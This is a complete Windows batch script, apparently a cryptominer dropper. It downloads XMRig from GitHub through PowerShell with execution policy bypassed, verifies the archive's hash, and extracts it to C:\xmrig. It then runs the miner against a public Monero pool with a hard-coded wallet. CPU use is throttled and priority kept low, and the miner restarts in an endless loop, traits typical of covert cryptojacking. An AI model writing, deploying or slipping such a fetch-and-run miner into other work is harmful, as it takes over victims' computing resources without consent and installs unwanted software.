@echo off
setlocal EnableDelayedExpansion
set "WORK_DIR=C:\xmrig"
set "ZIP_URL=https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
set "ZIP_FILE=%WORK_DIR%\xmrig.zip"
set "EXPECTED_HASH=BBA8097CB37D9B458A1CB1137876B27CDE6740D17FE4CCBC086BA07D87D9E147"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
cd /d "%WORK_DIR%"
:check_net
ping -n 1 1.1.1.1 >nul 2>&1
if %errorlevel% neq 0 (
    timeout /t 5 >nul
    goto check_net
)
set "EXE_PATH="
for /r "%WORK_DIR%" %%F in (xmrig.exe) do (
    set "EXE_PATH=%%F"
    goto :found_exe
)
:download_extract
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%'"
if not exist "%ZIP_FILE%" (
    timeout /t 10 >nul
    goto check_net
)
for /f "delims=" %%H in ('powershell -NoProfile -ExecutionPolicy Bypass -Command "(Get-FileHash -Path '%ZIP_FILE%' -Algorithm SHA256).Hash"') do set "ACTUAL_HASH=%%H"
if /i not "!ACTUAL_HASH!"=="%EXPECTED_HASH%" (
    del /f /q "%ZIP_FILE%" >nul 2>&1
    timeout /t 10 >nul
    goto check_net
)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%WORK_DIR%' -Force"
del /f /q "%ZIP_FILE%" >nul 2>&1
set "EXE_PATH="
for /r "%WORK_DIR%" %%F in (xmrig.exe) do (
    set "EXE_PATH=%%F"
    goto :found_exe
)
:found_exe
if defined EXE_PATH (
    "%EXE_PATH%" -o pool.supportxmr.com:3333 -u 48W6ehtvLN59EpJACwt7wJLt6vPY7yQTMGLJUPJ6Q9iPJy4cvTsHSW1Xm3JCcboxokEtxHnFweJRwC1Cry5fptdHJveNYSh -p pc1 --cpu-max-threads-hint 35 --cpu-priority 1
    timeout /t 10 >nul
    goto check_net
) else (
    timeout /t 10 >nul
    goto check_net
)
